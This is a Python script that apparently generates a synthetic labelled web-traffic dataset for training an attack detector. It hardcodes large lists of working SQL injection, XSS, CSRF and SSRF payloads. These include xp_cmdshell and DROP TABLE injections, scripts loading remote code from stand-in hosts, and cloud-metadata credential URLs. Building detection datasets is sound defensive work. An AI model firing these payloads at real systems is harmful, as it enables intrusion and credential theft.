import pandas as pd
import random
import string
import json
from faker import Faker
from datetime import datetime
import numpy as np

fake = Faker()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_status_code(is_malicious):
    if is_malicious:
        return random.choices([403, 500, 400, 200], weights=[0.4, 0.3, 0.2, 0.1])[0]
    else:
        return random.choices([200, 201, 204], weights=[0.7, 0.2, 0.1])[0]

def generate_realistic_headers():
    return {
        "x-forwarded-for": fake.ipv4(),
        "referrer": fake.uri(),
        "accept-language": random.choice([
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.6"
        ]),
        "accept": random.choice([
            "text/html,application/xhtml+xml,application/*;q=0.8",
            "application/json,text/plain,*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        ]),
        "connection": random.choice(["keep-alive", "close"]),
        "cache-control": random.choice(["no-cache", "max-age=0", "no-store"])
    }

def random_benign_body():
    style = random.choice(["urlencoded", "json", "multipart"])
    if style == "urlencoded":
        field_names = [
            'username', 'email', 'password', 'first_name', 'last_name',
            'address', 'phone', 'company', 'message', 'subject'
        ]
        fields = []
        for _ in range(random.randint(2, 6)):
            field = random.choice(field_names)
            if field == 'email':
                value = fake.email()
            elif field == 'username':
                value = fake.user_name()
            elif field == 'password':
                value = fake.password(length=random.randint(8, 16))
            elif field in ['first_name', 'last_name']:
                value = fake.name()
            elif field == 'address':
                value = fake.address().replace('\n', ' ')
            elif field == 'phone':
                value = fake.phone_number()
            elif field == 'company':
                value = fake.company()
            else:
                value = fake.text(max_nb_chars=50).replace('\n', ' ')
            fields.append(f"{field}={value}")
        return "&".join(fields)
    elif style == "json":
        data = {
            "user_id": random.randint(1, 10000),
            "username": fake.user_name(),
            "email": fake.email(),
            "profile": {
                "bio": fake.text(max_nb_chars=100),
                "location": fake.city(),
                "website": fake.url()
            }
        }
        return json.dumps(data)
    else:
        boundary = "----WebKitFormBoundary" + random_string(16)
        parts = []
        fields = ['name', 'email', 'message', 'phone', 'company']
        for field in random.sample(fields, random.randint(2, 4)):
            if field == 'email':
                value = fake.email()
            elif field == 'name':
                value = fake.name()
            elif field == 'phone':
                value = fake.phone_number()
            elif field == 'company':
                value = fake.company()
            else:
                value = fake.text(max_nb_chars=100)
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{field}\"\r\n\r\n{value}\r\n")
        if random.random() < 0.3:
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fake.file_name()}\"\r\nContent-Type: application/octet-stream\r\n\r\n[binary data]\r\n")
        return "".join(parts) + f"--{boundary}--"

def random_malicious_body(payload):
    style = random.choice(["urlencoded", "json", "multipart"])
    evasion = random.choice(['url_encoding', 'double_encoding', 'unicode_encoding', 'case_variation', 'comment_insertion'])
    if evasion == 'url_encoding':
        payload = payload.replace('<', '%3C').replace('>', '%3E').replace('"', '%22')
    elif evasion == 'double_encoding':
        payload = payload.replace('<', '%253C').replace('>', '%253E')
    elif evasion == 'unicode_encoding':
        payload = payload.replace('<', '\\u003C').replace('>', '\\u003E')
    elif evasion == 'case_variation':
        payload = payload.replace('script', 'ScRiPt').replace('select', 'SeLeCt')
    elif evasion == 'comment_insertion':
        payload = payload.replace('union', 'uni/**/on')
    if style == "urlencoded":
        fields = [f"input={payload}", f"data={random_string(6)}"]
        if random.random() < 0.5: fields.reverse()
        if random.random() < 0.3: fields.append(f"csrf_token={random_string(32)}")
        if random.random() < 0.2: fields.append(f"callback={payload}")
        return "&".join(fields)
    elif style == "json":
        data = {"input": payload, "user_id": random.randint(1, 1000)}
        if random.random() < 0.3: data["extra"] = random_string(5)
        if random.random() < 0.2: data["nested"] = {"payload": payload, "type": "malicious"}
        if random.random() < 0.15: data["metadata"] = {"source": payload}
        return json.dumps(data)
    else:
        boundary = "----WebKitFormBoundary" + random_string(16)
        parts = [
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"input\"\r\n\r\n{payload}\r\n",
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{fake.user_name()}\r\n"
        ]
        if random.random() < 0.3:
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"hidden\"\r\n\r\n{payload}\r\n")
        return "".join(parts) + f"--{boundary}--"

# --- Expanded Payloads for More Coverage --- #

sqli_payloads = [
    # Generic/Classic
    "1' OR '1'='1", "admin'--", "' OR 1=1;--", "' OR SLEEP(5)#", "' OR 1=1; DROP TABLE users;--", "' OR 1=1;--",
    "' OR 1=1; WAITFOR DELAY '0:0:5'--", "' OR 1=CAST(1 AS INT)--", "' OR 1=1 LIMIT 1 -- ", "' OR 1=1--",
    "' OR 1=1/*", "' OR 1=CONVERT(INT,(SELECT @@version))--",

    # MySQL
    "' OR 1=1#", "' OR 1=1-- -", "\" OR 1=1#", "\" OR 1=1-- -", "' OR sleep(5)--+", "' OR updatexml(1,concat(0x7e,(SELECT user())),0)--",
    "' UNION SELECT null, version()--", "' UNION SELECT user(), password FROM mysql.user--", "' OR 1=1 UNION SELECT NULL--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand(0)*2)) HAVING min(0)--",
    "' OR 1=1 ORDER BY 1--", "' OR 1=1 ORDER BY 2--", "' OR 1=1 ORDER BY 3--", "' OR 1=1 GROUP BY CONCAT(CHAR(65),CHAR(66),CHAR(67))--",
    "' OR 1=1 PROCEDURE ANALYSE()--", "' OR 1=1 INTO OUTFILE '/tmp/sqli.txt'--",

    # PostgreSQL
    "'; SELECT version();--", "'; SELECT current_user;--", "' UNION SELECT NULL, version()--", "' OR 1=1;--", "' OR pg_sleep(5)--",
    "' OR 1=CAST(1 AS INTEGER)--", "' OR 1=1 LIMIT 1--", "'; DROP TABLE users;--", "' OR 1=1 OFFSET 0--",
    "' OR 1=1 RETURNING password--", "' OR 1=1 FETCH FIRST 1 ROWS ONLY--",

    # MSSQL
    "'; EXEC xp_cmdshell('whoami');--", "'; WAITFOR DELAY '0:0:5'--", "'; SELECT @@version;--", "' OR 1=1;--", "' OR 1=1--",
    "'; EXEC sp_configure 'show advanced options', 1;--", "'; EXEC sp_password NULL, NULL, 'sa';--",
    "'; EXEC master..xp_cmdshell 'ping 10.10.1.2'--", "'; DECLARE @q varchar(99); SET @q='ping 10.10.1.2'; EXEC(@q);--",

    # Oracle
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 UNION SELECT NULL FROM dual--", "' OR 1=1 AND ROWNUM=1--",
    "' UNION SELECT banner FROM v$version--", "' OR 1=1 AND 1=(SELECT COUNT(*) FROM all_users)--",
    "' OR 1=1 AND EXISTS(SELECT * FROM dual)--", "' OR 1=1 AND 1=(SELECT COUNT(*) FROM v$session)--",

    # SQLite
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "' UNION SELECT sqlite_version()--", "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    "' OR 1=1 COLLATE NOCASE--", "' OR 1=1 LIMIT 1 OFFSET 1--",

    # NoSQL (MongoDB)
    '{"$ne": null}', '{"$gt": ""}', '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
    "' || '1'=='1", "' || 1==1 //", "'; return true; //",
    '{"username": {"$regex": ".*"}}', '{"$where": "this.password.length > 0"}',

    # Blind SQLi
    "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--", "' AND pg_sleep(5)--", "' AND 1=(SELECT COUNT(*) FROM users)--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--", "' AND SUBSTRING(@@version,1,1)='5'--",

    # Time-based
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--", "'; SELECT IF(1=1, sleep(5), 0)--", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "'; SELECT BENCHMARK(1000000,MD5('A'))--", "' OR IF(1=1,SLEEP(5),0)--",

    # Others
    "' OR ''='", "\" OR \"\"=\"", "' OR TRUE--", "' OR FALSE--", "' OR 'x'='x", "' OR 'x'='y",
    "' OR 2>1--", "' OR 2<1--", "' OR 1 LIKE 1--", "' OR 1 LIKE 2--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--", "' OR NOT EXISTS(SELECT * FROM information_schema.tables)--"
]
xss_payloads = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>", "<input autofocus onfocus=alert('XSS')>", "<a href=javascript:alert('XSS')>click</a>", "<math href=javascript:alert('XSS')></math>", 
    "<body onload=alert('XSS')>", "<img src='x' onerror='alert(1)'>", "<svg><script>alert(1)</script></svg>", "<details open ontoggle=alert(1)>", "<div style='background-image: url(javascript:alert(1))'>",
    "<img src='x' onerror='alert(1)'>", "<svg><script>alert(1)</script></svg>", "<details open ontoggle=alert(1)>",
    "<svg/onload=alert(1)>",
    "<input value=\"<>\"><iframe/src=javascript:confirm(1)>",
    "<input type=\"text\" value=`` <div/onmouseover='alert(1)'>X</div>",
    "<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
    "<img src=`xx:xx`onerror=alert(1)>",
    "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>",
    "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>",
    "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click</a></math>",
    "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>",
    "<svg contentScriptType=text/vbs><script>MsgBox+1</script></svg>",
    "<a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a>",
    "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>",
    "<script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script>",
    "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script>",
    "<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script>",
    "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>",
    "<script>+-+-1-+-+alert(1)</script>",
    "<body/onload=&lt;!--&gt;&#10alert(1)>",
    "<script itworksinallbrowsers>/*<script* */alert(1)</script>",
    "<img src ?itworksonchrome?\\/onerror = alert(1)>",
    "<svg><script>//\\&NewLine;confirm(1);</script></svg>",
    "<svg><script onlypossibleinopera:-)> alert(1)</script></svg>",
    "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe</a>",
    "<script x> alert(1) </script 1=2>",
    "<div/onmouseover='alert(1)'> style=\"x:\">",
    "<!--`<img/src=` onerror=alert(1)> -->",
    "<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",
    "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</div>",
    "<img src=x onerror=window.open('https://www.google.com/');>",
    "<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form>",
    "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click</a></math>",
    "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",
    "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>",
    "<a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a>",
    "'';!--\"<XSS>=&{()}",
    "'>//\\\\,<'>\">\">\"*\"",
    "'); alert('XSS",
    "<script>alert(1);</script>",
    "<script>alert('XSS');</script>",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<scr<script>ipt>alert('XSS');</scr</script>ipt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=foo.png onerror=alert(/xssed/) />",
    "<style>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</style>",
    "<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>",
    "<marquee><script>alert('XSS')</script></marquee>",
    "<IMG SRC=\\\"jav&#x09;ascript:alert('XSS');\\\">",
    "<IMG SRC=\\\"jav&#x0A;ascript:alert('XSS');\\\">",
    "<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "\"><script>alert(0)</script>",
    "<script src=http://yoursite.com/your_files.js></script>",
    "</title><script>alert(/xss/)</script>",
    "</textarea><script>alert(/xss/)</script>",
    "<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">",
    "<IMG DYNSRC=\\\"javascript:alert('XSS')\\\">",
    "<font style='color:expression(alert(document.cookie))'>",
    "<img src=\"javascript:alert('XSS')\">",
    "<script language=\"JavaScript\">alert('XSS')</script>",
    "<body onunload=\"javascript:alert('XSS');\">",
    "<body onLoad=\"alert('XSS');\">",
    "[color=red' onmouseover=\"alert('xss')\"]mouse over[/color]",
    "\"/></a></><img src=1.gif onerror=alert(1)>",
    "window.alert(\"Bonjour !\");",
    "<div style=\"x:expression((window.r==1)?'':eval('r=1; alert(String.fromCharCode(88,83,83));'))\">",
    "<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>",
    "\"><script alert(String.fromCharCode(88,83,83))</script>",
    "'>> <marquee><h1>XSS</h1></marquee>",
    "'\"><script>alert('XSS')</script>",
    "'>> <marquee><h1>XSS</h1></marquee>",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
    "<script>var var = 1; alert(var)</script>",
    "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
    "<?='<SCRIPT>alert(\"XSS\")</SCRIPT>'?>",
    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    "\" onfocus=alert(document.domain) \"> <\"",
    "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
    "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
    "perl -e 'print \"<SCR\\0IPT>alert(\"XSS\")</SCR\\0IPT>\";' > out",
    "perl -e 'print \"<IMG SRC=java\\0script:alert(\"XSS\")>\";' > out",
    "<br size=\"&{alert('XSS')}\">",
    "<scrscriptipt>alert(1)</scrscriptipt>",
    "</br style=a:expression(alert())>",
    "</script><script>alert(1)</script>",
    "\"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "[color=red width=expression(alert(123))][color]",
    "<BASE HREF=\"javascript:alert('XSS');//\">",
    "Execute(MsgBox(chr(88)&chr(83)&chr(83)))<",
    "\"></iframe><script>alert(123)</script>",
    "<body onLoad=\"while(true) alert('XSS');\">",
    "'\"></title><script>alert(1111)</script>",
    "</textarea>'\"><script>alert(document.cookie)</script>",
    "\"\"><script language=\"JavaScript\"> alert('X \\nS \\nS');</script>",
    "</script></script><<<<script><>>>><<<script>alert(123)</script>",
    "<html><noalert><noscript>(123)</noscript><script>(123)</script>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "'></select><script>alert(123)</script>",
    "'\">\"><script src = 'http://www.site.com/XSS.js'></script>",
    "}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>",
    "<SCRIPT>document.write(\"XSS\");</SCRIPT>",
    "a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('xss');\";eval(a+b+c+d);",
    "='><script>alert(\"xss\")</script>",
    "<script+src=\">\"+src=\"http://yoursite.com/xss.js?69,69\"></script>",
    "<body background=javascript:'\"><script>alert(navigator.userAgent)</script>></body>",
    "\">/XaDoS/><script>alert(document.cookie)</script><script src=\"http://www.site.com/XSS.js\"></script>",
    "\">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",
    "src=\"http://www.site.com/XSS.js\"></script>",
    "data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",
    "!--\" /><script>alert('xss');</script>",
    "<script>alert(\"XSS by \\nxss\")</script><marquee><h1>XSS by xss</h1></marquee>",
    "\"><script>alert(\"XSS by \\nxss\")</script>><marquee><h1>XSS by xss</h1></marquee>",
    "'\"></title><script>alert(\"XSS by \\nxss\")</script>><marquee><h1>XSS by xss</h1></marquee>",
    "<img \"\"\"><script>alert(\"XSS by \\nxss\")</script><marquee><h1>XSS by xss</h1></marquee>",
    "<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>",
    "\"><script>alert(1337)</script>\"><script>alert(\"XSS by \\nxss</h1></marquee>",
    "'\"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",
    "<iframe src=\"javascript:alert('XSS by \\nxss');\"></iframe><marquee><h1>XSS by xss</h1></marquee>",
    "'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt='",
    "\"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\"",
    "\\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt='",
    "http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??",
    "http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??",
    "'); alert('xss'); var x='",
    "\\'); alert('\\xss');var x='",
    "//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",
    "\"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>"
]

csrf_payloads = [
    # Realistic CSRF payloads simulating common actions
    "<form action='https://bank.example.com/transfer' method='POST'><input type='hidden' name='amount' value='5000'><input type='hidden' name='to_account' value='987654321'></form>",
    "<img src='https://social.example.com/api/follow?user=attacker'>",
    "<form action='https://mail.example.com/settings' method='POST'><input type='hidden' name='signature' value='Hacked by attacker'></form>",
    "<script>fetch('https://shop.example.com/cart/add?item=1234&qty=10', {method:'POST',credentials:'include'})</script>",
    "<form action='https://forum.example.com/profile/update' method='POST'><input type='hidden' name='bio' value='Visit attacker.com'></form>",
    "<form action='https://admin.example.com/user/delete' method='POST'><input type='hidden' name='user_id' value='42'></form>",
    "<img src='https://api.example.com/notifications/mark_all_read'>",
    "<form action='https://blog.example.com/comment/delete' method='POST'><input type='hidden' name='comment_id' value='1337'></form>",
    "<form action='https://account.example.com/email/change' method='POST'><input type='hidden' name='email' value='attacker@evil.com'></form>",
    "<form action='https://shop.example.com/order/cancel' method='POST'><input type='hidden' name='order_id' value='555'></form>",
    "<form action='https://wallet.example.com/send' method='POST'><input type='hidden' name='amount' value='100'><input type='hidden' name='recipient' value='attacker'></form>",
    "<script>new Image().src='https://api.example.com/user/promote?user=attacker'</script>",
    "<form action='https://settings.example.com/theme' method='POST'><input type='hidden' name='theme' value='dark'></form>",
    "<iframe src='https://account.example.com/logout'></iframe>",
    "<form action='https://api.example.com/subscribe' method='POST'><input type='hidden' name='plan' value='premium'></form>",
    "<form action='https://admin.example.com/role/change' method='POST'><input type='hidden' name='user' value='attacker'><input type='hidden' name='role' value='admin'></form>",
    "<img src='https://api.example.com/password/reset?user=admin'>",
    "<form action='https://profile.example.com/avatar/update' method='POST'><input type='hidden' name='avatar_url' value='https://evil.com/avatar.png'></form>",
    "<form action='https://api.example.com/friends/add' method='POST'><input type='hidden' name='friend_id' value='attacker'></form>",
    "<form action='https://shop.example.com/address/update' method='POST'><input type='hidden' name='address' value='123 Evil St'></form>"
]
ssrf_payloads = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    # Localhost
    "http://localhost/admin",
    "http://localhost:8080/",
    "http://127.0.0.1:8080/debug",
    "http://127.0.0.1:8000/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:9000/",
    "http://127.0.0.1/",
    # Internal IPs
    "http://10.0.0.1/",
    "http://10.10.1.2/",
    "http://192.168.1.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",
    # File protocol
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "file:///etc/hosts",
    # FTP
    "ftp://127.0.0.1:21/",
    "ftp://localhost/",
    "ftp://192.168.1.1/",
    # SMB
    "smb://127.0.0.1/",
    "smb://localhost/",
    "smb://192.168.1.1/",
    # Redis
    "redis://127.0.0.1:6379/",
    # MongoDB
    "mongodb://127.0.0.1:27017/",
    # Docker
    "http://localhost:2375/version",
    "http://127.0.0.1:2375/info",
    # SSRF with DNS rebinding
    "http://ssrf.example.com/",
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1.nip.io/",
    "http://localhost.localdomain/",
    # SSRF with URL encoding
    "http://127.0.0.1%2F%2F%2F%2F%2F%2F%2F%2F/",
    "http://%31%32%37.0.0.1/",
    # SSRF with IPv6
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    # SSRF with custom ports
    "http://localhost:22/",
    "http://localhost:3306/",
    "http://localhost:5432/",
    "http://localhost:11211/",
    # SSRF with internal hostnames
    "http://internal.company.com/",
    "http://intranet.local/",
    "http://admin.company.com/",
    # SSRF with request smuggling
    "http://localhost:80@evil.com/",
    "http://127.0.0.1:80@evil.com/",
    # SSRF with path traversal
    "http://localhost/../../../../etc/passwd",
    "http://127.0.0.1/../../../../etc/passwd",
    # SSRF with query params
    "http://localhost/?url=http://evil.com/",
    "http://127.0.0.1/?next=http://evil.com/",
    "http://169.254.169.254/?redirect=http://evil.com/",
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "curl/7.68.0",
    "PostmanRuntime/7.29.2",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

hosts = ["example.com", "api.example.com", "secure.example.com", "internal.local"]
content_types = ["application/x-www-form-urlencoded", "application/json", "multipart/form-data"]
methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
param_names = ["id", "search", "user", "token", "page", "query", "input", "csrf_token", "session", "action"]
benign_paths = ["/api/v1/users", "/dashboard", "/profile", "/settings", "/help", "/support"]

rows = []

for payload_list, attack_type in [(sqli_payloads, 'sqli'), (xss_payloads, 'xss'), (csrf_payloads, 'csrf'), (ssrf_payloads, 'ssrf')]:
    for _ in range(6000):
        payload = random.choice(payload_list)
        param = random.choice(param_names)
        row = {
            'Method': random.choices(methods, weights=[0.3, 0.5, 0.1, 0.05, 0.05])[0],
            'User-Agent': random.choice(user_agents),
            'host': random.choice(hosts),
            'content-type': random.choice(content_types),
            'URL': f"http://{random.choice(hosts)}/?{param}={payload}",
            'request_body': random_malicious_body(payload),
            'status_code': generate_status_code(True),
            'classification': 'malicious',
            'payload_type': attack_type,
            'is_behavioral_anomaly': random.choices([1, 0], weights=[0.4, 0.6])[0],
            **generate_realistic_headers()
        }
        rows.append(row)

for _ in range(26000):
    path = random.choice(benign_paths)
    row = {
        'Method': random.choices(methods, weights=[0.7, 0.2, 0.05, 0.03, 0.02])[0],
        'User-Agent': random.choice(user_agents),
        'host': random.choice(hosts),
        'content-type': random.choice(content_types),
        'URL': f"http://{random.choice(hosts)}{path}",
        'request_body': random_benign_body(),
        'status_code': generate_status_code(False),
        'classification': 'benign',
        'payload_type': 'benign',
        'is_behavioral_anomaly': 0,
        **generate_realistic_headers()
    }
    rows.append(row)

df = pd.DataFrame(rows)
df = df.sample(frac=1).reset_index(drop=True)  # Shuffle rows randomly

print(f"✅ Generated {len(df)} total samples")
print(f" - Malicious samples: {len(df[df['classification']=='malicious'])}")
print(f" - Benign samples: {len(df[df['classification']=='benign'])}")

df.to_csv('enhanced_synthetic_web_traffic_50000.csv', index=False)
print("✅ Dataset saved as: enhanced_synthetic_web_traffic_50000.csv")
    